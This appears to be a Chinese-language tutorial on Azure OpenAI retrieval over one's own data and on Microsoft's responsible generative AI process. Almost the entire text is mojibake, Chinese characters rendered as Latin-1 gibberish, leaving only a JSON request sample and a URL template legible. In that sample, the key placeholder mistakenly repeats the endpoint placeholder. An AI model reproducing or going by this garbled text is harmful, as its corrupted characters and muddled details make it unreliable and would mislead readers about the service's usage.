è¯·åŠ¡å¿…æä¾›å‡†ç¡®çš„å­—æ®µï¼ˆå°¤å…¶æ˜¯å†…å®¹æ•°æ®ï¼‰ï¼Œè®©æ¨¡å‹èƒ½å¤Ÿæä¾›æ›´å¥½çš„å“åº”ã€‚ ä½¿ç”¨è‡ªå·±çš„æ•°æ®ä¸æ¨¡å‹èŠå¤©å¯ä»¥åœ¨ Azure AI Studio ä¸­é€šè¿‡èŠå¤©æ“åœºæˆ– API å¯¹è‡ªå·±çš„æ•°æ®ä½¿ç”¨å¸¦ Azure OpenAI çš„ RAGã€‚ ä»¤ç‰Œæ³¨æ„äº‹é¡¹å’Œå»ºè®®çš„è®¾ç½®ç”±äºåŸºäºè‡ªæœ‰æ•°æ®çš„å¸¦ Azure OpenAI çš„ RAG åœ¨æç¤ºç¬¦ä¸­åŒ…å«ç´¢å¼•çš„æœç´¢ç»“æœï¼Œå› æ­¤è¯·åŠ¡å¿…äº†è§£è¿™ä¼šå¦‚ä½•å½±å“ä»¤ç‰Œåˆ†é…ã€‚ æ¯æ¬¡è°ƒç”¨æ¨¡å‹éƒ½åŒ…æ‹¬ç³»ç»Ÿæ¶ˆæ¯ã€ç”¨æˆ·æç¤ºã€å¯¹è¯å†å²è®°å½•ã€æ£€ç´¢çš„æœç´¢æ–‡æ¡£ã€å†…éƒ¨æç¤ºå’Œæ¨¡å‹å“åº”çš„ä»¤ç‰Œã€‚ ä¾‹å¦‚ï¼Œç³»ç»Ÿæ¶ˆæ¯æ˜¯æ¨¡å‹æŒ‡ä»¤çš„æœ‰ç”¨å‚è€ƒï¼Œå¹¶ä¸”åŒ…å«åœ¨æ¯æ¬¡è°ƒç”¨ä¸­ã€‚ è™½ç„¶ç³»ç»Ÿæ¶ˆæ¯æ²¡æœ‰ä»¤ç‰Œé™åˆ¶ï¼Œä½†ä½¿ç”¨è‡ªå·±çš„æ•°æ®æ—¶ï¼Œå¦‚æœè¶…è¿‡ 200 ä¸ªä»¤ç‰Œï¼Œç³»ç»Ÿæ¶ˆæ¯å°†è¢«æˆªæ–­ã€‚ ä½¿ç”¨è‡ªå·±çš„æ•°æ®ä¸º 1500 ä¸ªä»¤ç‰Œæ—¶ï¼Œæ¨¡å‹çš„å“åº”ä¹Ÿä¼šå—åˆ°é™åˆ¶ã€‚ ç”±äºè¿™äº›ä»¤ç‰Œé™åˆ¶ï¼Œå»ºè®®åœ¨è°ƒç”¨ä¸­é™åˆ¶é—®é¢˜é•¿åº¦å’Œå¯¹è¯å†å²è®°å½•é•¿åº¦ã€‚ æç¤ºå·¥ç¨‹æŠ€æœ¯ï¼ˆä¾‹å¦‚åˆ†è§£ä»»åŠ¡å’Œæ€ç»´æç¤ºé“¾ï¼‰å¯ä»¥å¸®åŠ©æ¨¡å‹æ›´æœ‰æ•ˆåœ°å“åº”ã€‚ ä½¿ç”¨ APIå°† API ä¸ä½ è‡ªå·±çš„æ•°æ®é…åˆä½¿ç”¨æ—¶ï¼Œéœ€è¦æŒ‡å®šå­˜å‚¨æ•°æ®çš„æ•°æ®æºã€‚ æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œéƒ½éœ€è¦åŒ…å« AI æœç´¢èµ„æºçš„ endpointã€key å’Œ indexNameã€‚ è¯·æ±‚æ­£æ–‡å°†ç±»ä¼¼äºä»¥ä¸‹ JSONã€‚ 12345678910111213141516171819202122&#123; &quot;dataSources&quot;: [ &#123; &quot;type&quot;: &quot;AzureCognitiveSearch&quot;, &quot;parameters&quot;: &#123; &quot;endpoint&quot;: &quot;&lt;your_search_endpoint&gt;&quot;, &quot;key&quot;: &quot;&lt;your_search_endpoint&gt;&quot;, &quot;indexName&quot;: &quot;&lt;your_search_index&gt;&quot; &#125; &#125; ], &quot;messages&quot;:[ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant assisting users with travel recommendations.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;I want to go to New York. Where should I stay?&quot; &#125; ]&#125; ä½¿ç”¨è‡ªå·±çš„æ•°æ®æ—¶çš„è°ƒç”¨éœ€è¦å‘é€åˆ°ä¸è°ƒç”¨åŸºç¡€æ¨¡å‹ï¼ˆåŒ…æ‹¬ extensionsï¼‰æ—¶ä½¿ç”¨çš„ç»ˆç»“ç‚¹ä¸åŒçš„ç»ˆç»“ç‚¹ã€‚ è°ƒç”¨ä¼šå‘é€åˆ°ç±»ä¼¼äºä¸‹é¢çš„ URLã€‚ 1&lt;your_azure_openai_resource&gt;/openai/deployments/&lt;deployment_name&gt;/chat/completions?api-version=&lt;version&gt; è¯·æ±‚è¿˜éœ€è¦åŒ…æ‹¬ Content-Type å’Œ api-keyã€‚ ç»ƒä¹  - ä½¿ç”¨ Azure OpenAI æœåŠ¡ä¸º RAG æ·»åŠ æ•°æ®ç°åœ¨ï¼Œè®©æˆ‘ä»¬åœ¨ Azure OpenAI Studio ä¸­å¯¹æ•°æ®ä½¿ç”¨ Azure OpenAIã€‚ åœ¨æœ¬ç»ƒä¹ ä¸­ï¼Œä½ å°†éƒ¨ç½² Azure OpenAI æ¨¡å‹ã€è¿æ¥ç¤ºä¾‹æ•°æ®ï¼Œå¹¶æ ¹æ®ç¤ºä¾‹æ•°æ®ç”Ÿæˆå“åº”ã€‚ æ³¨æ„ ä¸ºäº†å®Œæˆæœ¬ç»ƒä¹ ï¼Œä½ å°†éœ€è¦ä¸€ä¸ª Azure è®¢é˜…ã€‚ ä½ è¿˜éœ€è¦è¯·æ±‚ï¼ˆå¹¶è¢«æˆäºˆï¼‰Azure OpenAI è®¿é—®æƒé™ã€‚ è¦å®Œæˆæ­¤æ¨¡å—çš„ç»ƒä¹ ï¼Œè¯·å¯åŠ¨ VM å¹¶æŒ‰ç…§è¯´æ˜è¿›è¡Œæ“ä½œã€‚ æ³¨æ„ è‹¥è¦å®Œæˆæ­¤ç»ƒä¹ ï¼Œä½ å°†éœ€è¦ Microsoft Azure è®¢é˜…ã€‚ å¦‚æœä½ è¿˜æ²¡æœ‰è¯¥è®¢é˜…ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ªã€‚ å¦‚æœéœ€è¦ä¸ºæ­¤ç»ƒä¹ è®¾ç½®è®¡ç®—æœºï¼Œå¯ä»¥ä½¿ç”¨æ­¤è®¾ç½®æŒ‡å—ï¼Œç„¶åæŒ‰ç…§ä¸‹é¢é“¾æ¥çš„ç»ƒä¹ è¯´æ˜è¿›è¡Œæ“ä½œã€‚ è¯·æ³¨æ„ï¼Œè®¾ç½®æŒ‡å—é€‚ç”¨äºå¤šä¸ªå¼€å‘ç»ƒä¹ ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬è¯¥ç‰¹å®šç»ƒä¹ ä¸éœ€è¦çš„è½¯ä»¶ã€‚ æ­¤å¤–ï¼Œç”±äºå¯èƒ½çš„æ“ä½œç³»ç»Ÿå’Œè®¾ç½®é…ç½®çš„èŒƒå›´å¤ªå¹¿ï¼Œå¦‚æœä½ é€‰æ‹©åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šå®Œæˆæ­¤ç»ƒä¹ ï¼Œæˆ‘ä»¬å°†æ— æ³•æä¾›æ”¯æŒã€‚ è¦åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸ŠæŒ‰ç…§è¿™äº›è¯´æ˜è¿›è¡Œæ“ä½œï¼Œå¯ä»¥æŒ‰ç…§æ­¤å¤„çš„ç»ƒä¹ è¯´æ˜è¿›è¡Œæ“ä½œã€‚ æç¤º å®Œæˆç»ƒä¹ åï¼Œå¦‚æœä½ å·²å®Œæˆå¯¹ Azure AI æœåŠ¡çš„å­¦ä¹ ï¼Œè¯·åˆ é™¤åœ¨ç»ƒä¹ æœŸé—´åˆ›å»ºçš„ Azure èµ„æºã€‚ åˆ†è§£ä»»åŠ¡å¹¶ä½¿ç”¨æ€ç»´æç¤ºé“¾å¯å¸®åŠ©æ¨¡å‹åœ¨ä»¤ç‰Œé™åˆ¶å†…æ›´æœ‰æ•ˆåœ°åšå‡ºå“åº”ã€‚ä½¿ç”¨ Azure OpenAI Studioï¼Œå¯ä»¥åœ¨æ’å…¥ç´¢å¼•æ—¶è¿›è¡Œé€‚å½“çš„åˆ†å—ï¼Œä»è€Œäº§ç”Ÿæ›´å¥½çš„å“åº”ã€‚ åŸºäºæ•°æ®çš„ Azure OpenAI æ”¯æŒå¼€å‘äººå‘˜ä½¿ç”¨å—æ”¯æŒçš„ AI èŠå¤©æ¨¡å‹æ¥å¼•ç”¨ç‰¹å®šæ•°æ®æºä»¥ä½¿å“åº”è½åœ°ã€‚ ç”Ÿæˆå¼ AI åŸºç¡€ç”Ÿæˆå¼ AI æ˜¯æœ‰å²ä»¥æ¥æœ€å¼ºå¤§çš„ä¸€é¡¹æŠ€æœ¯è¿›æ­¥ã€‚ å®ƒä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ„å»ºè¿™æ ·çš„åº”ç”¨ç¨‹åºï¼šä½¿ç”¨åˆ©ç”¨ Internet ä¸Šçš„å¤§é‡æ•°æ®è¿›è¡Œè®­ç»ƒçš„æœºå™¨å­¦ä¹ æ¨¡å‹æ¥ç”Ÿæˆä¸äººç±»åˆ›å»ºçš„å†…å®¹æ²¡æœ‰å·®åˆ«çš„æ–°å†…å®¹ã€‚ ç”Ÿæˆå¼ AI çš„åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œä½†ä¹Ÿå¸¦æ¥äº†ä¸€äº›å±é™©ï¼Œå¹¶ä¸”è¦æ±‚æ•°æ®ç§‘å­¦å®¶ã€å¼€å‘äººå‘˜å’Œå‚ä¸åˆ›å»ºç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆçš„å…¶ä»–äººé‡‡ç”¨è´Ÿè´£ä»»çš„æ–¹æ³•æ¥è¯†åˆ«ã€è¡¡é‡å’Œç¼“è§£é£é™©ã€‚ æœ¬æ¨¡å—æ¢è®¨äº†ä¸€ç»„ç”± Microsoft ä¸“å®¶å®šä¹‰çš„è´Ÿè´£ä»»ç”Ÿæˆå¼ AI æŒ‡å—ã€‚ è´Ÿè´£ä»»ç”Ÿæˆå¼ AI æŒ‡å—åŸºäº Microsoft çš„è´Ÿè´£ä»» AI æ ‡å‡†ï¼Œä»¥è€ƒè™‘ä¸ç”Ÿæˆå¼ AI æ¨¡å‹ç›¸å…³çš„ç‰¹å®šæ³¨æ„äº‹é¡¹ã€‚ ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆMicrosoft æœ‰å…³è´Ÿè´£ä»»ç”Ÿæˆå¼ AI çš„æŒ‡å—å®ç”¨ä¸”å¯æ“ä½œã€‚ å®ƒå®šä¹‰äº†ä¸€ä¸ªå››é˜¶æ®µè¿‡ç¨‹ï¼Œç”¨äºåœ¨ä½¿ç”¨ç”Ÿæˆå¼æ¨¡å‹æ—¶ä¸ºè´Ÿè´£ä»»çš„ AI åˆ¶å®šå’Œå®æ–½è®¡åˆ’ã€‚ è¯¥è¿‡ç¨‹çš„å››ä¸ªé˜¶æ®µåˆ†åˆ«ä¸ºï¼š è¯†åˆ«ä¸è®¡åˆ’è§£å†³æ–¹æ¡ˆç›¸å…³çš„æ½œåœ¨å±å®³ã€‚è¡¡é‡è§£å†³æ–¹æ¡ˆç”Ÿæˆçš„è¾“å‡ºä¸­æ˜¯å¦å­˜åœ¨è¿™äº›å±å®³ã€‚ç¼“è§£è§£å†³æ–¹æ¡ˆä¸­å¤šä¸ªå±‚çº§çš„å±å®³ï¼Œä»¥æœ€å¤§ç¨‹åº¦åœ°å‡å°‘å…¶å­˜åœ¨å’Œå½±å“ï¼Œç¡®ä¿å°±ç”¨æˆ·çš„æ½œåœ¨é£é™©è¿›è¡Œé€æ˜çš„æ²Ÿé€šã€‚é€šè¿‡å®šä¹‰å¹¶éµå¾ªéƒ¨ç½²å’Œè¿è¥å°±ç»ªè®¡åˆ’æ¥è´Ÿè´£ä»»åœ°è¿è¥è§£å†³æ–¹æ¡ˆã€‚ è¯†åˆ«æ½œåœ¨å±å®³è´Ÿè´£ä»»ç”Ÿæˆå¼ AI è¿‡ç¨‹çš„ç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯è¯†åˆ«å¯èƒ½å½±å“è®¡åˆ’è§£å†³æ–¹æ¡ˆçš„æ½œåœ¨å±å®³ã€‚ æ­¤é˜¶æ®µåŒ…å«å››ä¸ªæ­¥éª¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š è¯†åˆ«æ½œåœ¨å±å®³ ç¡®å®šå·²è¯†åˆ«å±å®³çš„ä¼˜å…ˆçº§ æµ‹è¯•å¹¶éªŒè¯ä¼˜å…ˆçš„å±å®³ è®°å½•å¹¶å…±äº«å·²éªŒè¯çš„å±å®³ 1ï¼šè¯†åˆ«æ½œåœ¨å±å®³ä¸ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆç›¸å…³çš„æ½œåœ¨å±å®³å–å†³äºå¤šç§å› ç´ ï¼ŒåŒ…æ‹¬ç”¨äºç”Ÿæˆè¾“å‡ºçš„ç‰¹å®šæœåŠ¡å’Œæ¨¡å‹ï¼Œä»¥åŠç”¨äºè‡ªå®šä¹‰è¾“å‡ºçš„ä»»ä½•å¾®è°ƒæˆ–åŸºç¡€æ•°æ®ã€‚ ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆä¸­çš„ä¸€äº›å¸¸è§æ½œåœ¨å±å®³ç±»å‹åŒ…æ‹¬ï¼š ç”Ÿæˆå…·æœ‰æ”»å‡»æ€§ã€è´¬ä¹‰æ€§æˆ–æ­§è§†æ€§çš„å†…å®¹ã€‚ ç”ŸæˆåŒ…å«ä¸å‡†ç¡®äº‹å®çš„å†…å®¹ã€‚ ç”Ÿæˆé¼“åŠ±æˆ–æ”¯æŒéæ³•æˆ–ä¸é“å¾·è¡Œä¸ºæˆ–åšæ³•çš„å†…å®¹ã€‚ è‹¥è¦å®Œå…¨äº†è§£è§£å†³æ–¹æ¡ˆä¸­æœåŠ¡å’Œæ¨¡å‹çš„å·²çŸ¥é™åˆ¶å’Œè¡Œä¸ºï¼Œè¯·å‚é˜…å¯ç”¨æ–‡æ¡£ã€‚ ä¾‹å¦‚ï¼ŒAzure OpenAI æœåŠ¡åŒ…æ‹¬é€æ˜åº¦è¯´æ˜ï¼Œå¯ç”¨äºäº†è§£ä¸æœåŠ¡åŠå…¶åŒ…å«çš„æ¨¡å‹ç›¸å…³çš„ç‰¹å®šæ³¨æ„äº‹é¡¹ã€‚ æ­¤å¤–ï¼Œå„æ¨¡å‹å¼€å‘äººå‘˜å¯èƒ½ä¼šæä¾›ç›¸åº”çš„æ–‡æ¡£ï¼Œä¾‹å¦‚ GPT-4 æ¨¡å‹çš„ OpenAI ç³»ç»Ÿå¡ã€‚ è¯·è€ƒè™‘æŸ¥çœ‹ Microsoft è´Ÿè´£ä»» AI å½±å“è¯„ä¼°æŒ‡å—ä¸­çš„æŒ‡å—ï¼Œå¹¶ä½¿ç”¨å…³è”çš„è´Ÿè´£ä»» AI å½±å“è¯„ä¼°æ¨¡æ¿æ¥è®°å½•æ½œåœ¨çš„å±å®³ã€‚ 2ï¼šç¡®å®šå±å®³çš„ä¼˜å…ˆçº§å¯¹äºå·²ç¡®å®šçš„æ¯ä¸ªæ½œåœ¨å±å®³ï¼Œè¯·è¯„ä¼°å…¶å‘ç”Ÿçš„å¯èƒ½æ€§ä»¥åŠç”±æ­¤äº§ç”Ÿçš„å½±å“ç¨‹åº¦ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ ç„¶åï¼Œä½¿ç”¨æ­¤ä¿¡æ¯ä¼˜å…ˆå¤„ç†æœ€å¯èƒ½ä¸”å½±å“æœ€å¤§çš„å±å®³ã€‚ æ­¤ä¼˜å…ˆçº§æ’åºå°†ä½¿ä½ èƒ½å¤Ÿä¸“æ³¨äºæŸ¥æ‰¾å’Œç¼“è§£è§£å†³æ–¹æ¡ˆä¸­æœ€æœ‰å®³çš„é£é™©ã€‚ ä¼˜å…ˆçº§æ’åºå¿…é¡»è€ƒè™‘åˆ°è§£å†³æ–¹æ¡ˆçš„é¢„æœŸç”¨é€”ä»¥åŠæ»¥ç”¨çš„å¯èƒ½æ€§ï¼Œå¹¶ä¸”å¯èƒ½æ˜¯ä¸»è§‚çš„ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªæ™ºèƒ½å¨æˆ¿åŠ©æ‰‹ï¼Œä¸ºå¨å¸ˆå’Œä¸šä½™å¨å¸ˆæä¾›é£Ÿè°±å¸®åŠ©ã€‚ æ½œåœ¨çš„å±å®³å¯èƒ½åŒ…æ‹¬ï¼š è¯¥è§£å†³æ–¹æ¡ˆæä¾›çš„çƒ¹é¥ªæ—¶é—´ä¸å‡†ç¡®ï¼Œå¯¼è‡´é£Ÿç‰©æœªç…®ç†Ÿï¼Œå¯èƒ½å¯¼è‡´ç”Ÿç—…ã€‚ å½“æç¤ºæ—¶ï¼Œè¯¥è§£å†³æ–¹æ¡ˆæä¾›äº†ä¸€ç§è‡´å‘½æ¯’è¯çš„é…æ–¹ï¼Œè¿™ç§æ¯’è¯å¯ä»¥ç”¨æ—¥å¸¸æˆåˆ†åˆ¶æˆã€‚ è™½ç„¶è¿™ä¸¤ç§ç»“æœéƒ½ä¸ç†æƒ³ï¼Œä½†ä½ å¯èƒ½ä¼šè®¤ä¸ºï¼Œè¯¥è§£å†³æ–¹æ¡ˆæ”¯æŒåˆ¶é€ è‡´å‘½æ¯’è¯çš„æ½œåŠ›æ¯”åˆ¶é€ æœªç…®ç†Ÿé£Ÿç‰©çš„æ½œåŠ›å…·æœ‰æ›´å¤§çš„å½±å“ã€‚ ä½†æ˜¯ï¼Œé‰´äºè¯¥è§£å†³æ–¹æ¡ˆçš„æ ¸å¿ƒä½¿ç”¨åœºæ™¯ï¼Œä½ å¯èƒ½è¿˜ä¼šè®¤ä¸ºè¯¥è§£å†³æ–¹æ¡ˆæ¨èä¸å‡†ç¡®çƒ¹é¥ªæ—¶é—´çš„é¢‘ç‡å¯èƒ½è¿œé«˜äºæ˜ç¡®è¦æ±‚æä¾›æ¯’è¯é£Ÿè°±çš„ç”¨æˆ·æ•°ã€‚ æœ€ç»ˆä¼˜å…ˆçº§ç¡®å®šæ˜¯å¼€å‘å›¢é˜Ÿè®¨è®ºçš„ä¸»é¢˜ï¼Œè¿™å¯èƒ½æ¶‰åŠå’¨è¯¢ç­–ç•¥æˆ–æ³•å¾‹ä¸“å®¶ï¼Œä»¥ä¾¿å……åˆ†ç¡®å®šä¼˜å…ˆçº§ã€‚ 3ï¼šæµ‹è¯•å’ŒéªŒè¯æ˜¯å¦å­˜åœ¨å±å®³æœ‰äº†ä¼˜å…ˆçº§åˆ—è¡¨åï¼Œå¯ä»¥æµ‹è¯•è§£å†³æ–¹æ¡ˆä»¥éªŒè¯å±å®³æ˜¯å¦å‘ç”Ÿï¼Œå¦‚æœå‘ç”Ÿï¼Œåœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹å‘ç”Ÿã€‚ æµ‹è¯•è¿˜å¯èƒ½æ­ç¤ºå­˜åœ¨ä»¥å‰æ— æ³•è¯†åˆ«çš„å±å®³ï¼Œä½ å¯ä»¥å°†è¿™äº›å±å®³æ·»åŠ åˆ°åˆ—è¡¨ä¸­ã€‚ æµ‹è¯•è½¯ä»¶è§£å†³æ–¹æ¡ˆä¸­æ½œåœ¨å±å®³æˆ–æ¼æ´çš„å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨â€œçº¢é˜Ÿâ€æµ‹è¯•ï¼Œå…¶ä¸­ä¸€ç»„æµ‹è¯•äººå‘˜æ•…æ„æ¢æµ‹è§£å†³æ–¹æ¡ˆçš„å¼±ç‚¹ï¼Œå¹¶å°è¯•ç”Ÿæˆæœ‰å®³ç»“æœã€‚ å‰é¢è®¨è®ºçš„æ™ºèƒ½å¨æˆ¿åŠ©æ‰‹è§£å†³æ–¹æ¡ˆçš„ç¤ºä¾‹æµ‹è¯•å¯èƒ½åŒ…æ‹¬è¯·æ±‚æœ‰æ¯’é£Ÿè°±æˆ–å¿«é€Ÿé£Ÿè°±ï¼Œå…¶ä¸­åŒ…å«åº”å½»åº•ç…®ç†Ÿçš„æˆåˆ†ã€‚ åº”è®°å½•å’ŒæŸ¥çœ‹çº¢é˜Ÿçš„æˆåŠŸæƒ…å†µï¼Œä»¥å¸®åŠ©ç¡®å®šä½¿ç”¨è¯¥è§£å†³æ–¹æ¡ˆæ—¶ç”Ÿæˆæœ‰å®³è¾“å‡ºçš„ç°å®å¯èƒ½æ€§ã€‚ æ³¨æ„ çº¢é˜Ÿåˆ¤ç ”æ˜¯ä¸€ç§ç­–ç•¥ï¼Œé€šå¸¸ç”¨äºæŸ¥æ‰¾å¯èƒ½å±åŠè½¯ä»¶è§£å†³æ–¹æ¡ˆå®Œæ•´æ€§çš„å®‰å…¨æ¼æ´æˆ–å…¶ä»–å¼±ç‚¹ã€‚ é€šè¿‡æ‰©å±•æ­¤æ–¹æ³•ä»¥ä»ç”Ÿæˆå¼ AI ä¸­æŸ¥æ‰¾æœ‰å®³å†…å®¹ï¼Œå¯ä»¥å®æ–½è´Ÿè´£ä»»çš„ AI è¿‡ç¨‹ï¼Œè¯¥æµç¨‹åŸºäºå¹¶è¡¥å……äº†ç°æœ‰çš„ç½‘ç»œå®‰å…¨åšæ³•ã€‚ è‹¥è¦è¯¦ç»†äº†è§£ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆçš„çº¢é˜Ÿåˆ¤ç ”ï¼Œè¯·å‚é˜… Azure OpenAI æœåŠ¡æ–‡æ¡£ä¸­çš„çº¢é˜Ÿåˆ¤ç ”å¤§å‹è¯­è¨€æ¨¡å‹ (LLM) ç®€ä»‹ã€‚ æ”¶é›†è¯æ®ä»¥æ”¯æŒè§£å†³æ–¹æ¡ˆä¸­å­˜åœ¨æ½œåœ¨å±å®³æ—¶ï¼Œè¯·è®°å½•è¯¦ç»†ä¿¡æ¯å¹¶ä¸åˆ©ç›Šå¹²ç³»äººå…±äº«ã€‚ ç„¶åï¼Œåº”ç»´æŠ¤æŒ‰ä¼˜å…ˆçº§æ’åˆ—çš„å±å®³åˆ—è¡¨ï¼Œå¹¶åœ¨ç¡®å®šæ–°çš„å±å®³æ—¶æ·»åŠ åˆ°è¯¥åˆ—è¡¨ã€‚ è¡¡é‡æ½œåœ¨å±å®³ç¼–è¯‘æ½œåœ¨æœ‰å®³è¾“å‡ºçš„ä¼˜å…ˆçº§åˆ—è¡¨åï¼Œå¯ä»¥æµ‹è¯•è§£å†³æ–¹æ¡ˆä»¥è¡¡é‡å±å®³çš„å­˜åœ¨æƒ…å†µå’Œå½±å“ã€‚ ä½ çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªåˆå§‹åŸºçº¿ï¼Œç”¨äºé‡åŒ–è§£å†³æ–¹æ¡ˆåœ¨ç»™å®šä½¿ç”¨åœºæ™¯ä¸­äº§ç”Ÿçš„å±å®³ï¼Œç„¶ååœ¨å¯¹è§£å†³æ–¹æ¡ˆè¿›è¡Œè¿­ä»£æ›´æ”¹ä»¥ç¼“è§£å±å®³æ—¶ï¼Œæ ¹æ®åŸºçº¿è·Ÿè¸ªæ”¹è¿›ã€‚ è¡¡é‡ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ½œåœ¨å±å®³çš„é€šç”¨æ–¹æ³•åŒ…æ‹¬ä¸‰ä¸ªæ­¥éª¤ï¼š å‡†å¤‡å¯èƒ½ä¼šå¯¼è‡´ä½ ä¸ºç³»ç»Ÿè®°å½•çš„æ¯ä¸ªæ½œåœ¨å±å®³çš„å„ç§è¾“å…¥æç¤ºé€‰é¡¹ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ å·²è¯†åˆ«çš„å…¶ä¸­ä¸€ä¸ªæ½œåœ¨å±å®³æ˜¯ç³»ç»Ÿå¯ä»¥å¸®åŠ©ç”¨æˆ·åˆ¶é€ å±é™©æ¯’è¯ï¼Œè¯·åˆ›å»ºä¸€ç³»åˆ—å¯èƒ½ä¼šå¼•å‘æ­¤ç»“æœçš„è¾“å…¥æç¤ºé€‰é¡¹ï¼Œä¾‹å¦‚â€œå¦‚ä½•ä½¿ç”¨å®¶ä¸­å¸¸è§çš„æ—¥å¸¸åŒ–å­¦å“åˆ¶é€ å‡ºæ— æ³•æ£€æµ‹åˆ°çš„æ¯’è¯ï¼Ÿâ€ å°†æç¤ºæäº¤åˆ°ç³»ç»Ÿå¹¶æ£€ç´¢ç”Ÿæˆçš„è¾“å‡ºã€‚ åº”ç”¨é¢„å®šä¹‰çš„æ ‡å‡†æ¥è¯„ä¼°è¾“å‡ºï¼Œå¹¶æ ¹æ®å…¶åŒ…å«çš„æ½œåœ¨å±å®³å±‚çº§å¯¹å…¶è¿›è¡Œåˆ†ç±»ã€‚ åˆ†ç±»å¯ä»¥åƒâ€œæœ‰å®³â€æˆ–â€œæ— å®³â€ä¸€æ ·ç®€å•ï¼Œä¹Ÿå¯ä»¥å®šä¹‰ä¸€ç³»åˆ—å±å®³ç¨‹åº¦ã€‚ æ— è®ºå®šä¹‰å“ªä¸ªç±»åˆ«ï¼Œéƒ½å¿…é¡»ç¡®å®šå¯åº”ç”¨äºè¾“å‡ºçš„ä¸¥æ ¼æ ‡å‡†ï¼Œä»¥ä¾¿å¯¹å…¶è¿›è¡Œåˆ†ç±»ã€‚ åº”è®°å½•è¡¡é‡è¿‡ç¨‹çš„ç»“æœå¹¶ä¸åˆ©ç›Šå¹²ç³»äººå…±äº«ã€‚ æ‰‹åŠ¨å’Œè‡ªåŠ¨æµ‹è¯•åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåº”é¦–å…ˆæ‰‹åŠ¨æµ‹è¯•å’Œè¯„ä¼°ä¸€å°éƒ¨åˆ†è¾“å…¥ï¼Œä»¥ç¡®ä¿æµ‹è¯•ç»“æœä¸€è‡´ï¼Œå¹¶ä¸”è¯„ä¼°æ ‡å‡†å®šä¹‰å¾—è¶³å¤Ÿæ˜ç¡®ã€‚ ç„¶åï¼Œè®¾è®¡ä¸€ç§æ–¹æ³•æ¥ä½¿ç”¨å¤§é‡æµ‹è¯•ç”¨ä¾‹è‡ªåŠ¨è¿›è¡Œæµ‹è¯•å’Œè¡¡é‡ã€‚ è‡ªåŠ¨è§£å†³æ–¹æ¡ˆå¯èƒ½åŒ…æ‹¬ä½¿ç”¨åˆ†ç±»æ¨¡å‹æ¥è‡ªåŠ¨è¯„ä¼°è¾“å‡ºã€‚ å³ä½¿å®ç°äº†è‡ªåŠ¨æ–¹æ³•æ¥æµ‹è¯•å’Œè¡¡é‡å±å®³ï¼Œä¹Ÿåº”è¯¥å®šæœŸæ‰§è¡Œæ‰‹åŠ¨æµ‹è¯•æ¥éªŒè¯æ–°åœºæ™¯ï¼Œå¹¶ç¡®ä¿è‡ªåŠ¨æµ‹è¯•è§£å†³æ–¹æ¡ˆæ­£å¸¸æ‰§è¡Œã€‚ ç¼“è§£æ½œåœ¨å±å®³ç¡®å®šåŸºçº¿ä»¥åŠè¡¡é‡è§£å†³æ–¹æ¡ˆç”Ÿæˆçš„æœ‰å®³è¾“å‡ºçš„æ–¹æ³•åï¼Œå¯ä»¥é‡‡å–æªæ–½ç¼“è§£æ½œåœ¨å±å®³ï¼Œå¹¶åœ¨é€‚å½“æ—¶é‡æ–°æµ‹è¯•ä¿®æ”¹åçš„ç³»ç»Ÿï¼Œå°†å±å®³å±‚çº§ä¸åŸºçº¿è¿›è¡Œæ¯”è¾ƒã€‚ ç¼“è§£ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆä¸­çš„æ½œåœ¨å±å®³æ¶‰åŠåˆ†å±‚æ–¹æ³•ï¼Œå…¶ä¸­ç¼“è§£æŠ€æœ¯å¯åœ¨å››ä¸ªå±‚çº§ä¸­çš„æ¯ä¸€å±‚çº§åº”ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š Model å®‰å…¨ç³»ç»Ÿ å…ƒæç¤ºå’Œæ¥åœ° ç”¨æˆ·ä½“éªŒ 1ï¼šæ¨¡å‹å±‚çº§æ¨¡å‹å±‚çº§ç”±ç”Ÿæˆå¼ AI æ¨¡å‹ç»„æˆï¼Œæ˜¯è§£å†³æ–¹æ¡ˆçš„æ ¸å¿ƒã€‚ ä¾‹å¦‚ï¼Œè§£å†³æ–¹æ¡ˆå¯èƒ½å›´ç»• GPT-4 ç­‰æ¨¡å‹æ„å»ºã€‚ å¯åœ¨æ¨¡å‹å±‚çº§åº”ç”¨çš„ç¼“è§£æªæ–½åŒ…æ‹¬ï¼š é€‰æ‹©é€‚åˆé¢„æœŸè§£å†³æ–¹æ¡ˆç”¨é€”çš„æ¨¡å‹ã€‚ ä¾‹å¦‚ï¼Œè™½ç„¶ GPT-4 å¯èƒ½æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ä¸”ç”¨é€”å¹¿æ³›çš„æ¨¡å‹ï¼Œä½†åœ¨åªéœ€å¯¹å°å‹ç‰¹å®šæ–‡æœ¬è¾“å…¥è¿›è¡Œåˆ†ç±»çš„è§£å†³æ–¹æ¡ˆä¸­ï¼Œæ›´ç®€å•çš„æ¨¡å‹ä¾¿å¯æä¾›æ‰€éœ€çš„åŠŸèƒ½ï¼ŒåŒæ—¶é™ä½ç”Ÿæˆæœ‰å®³å†…å®¹çš„é£é™©ã€‚ 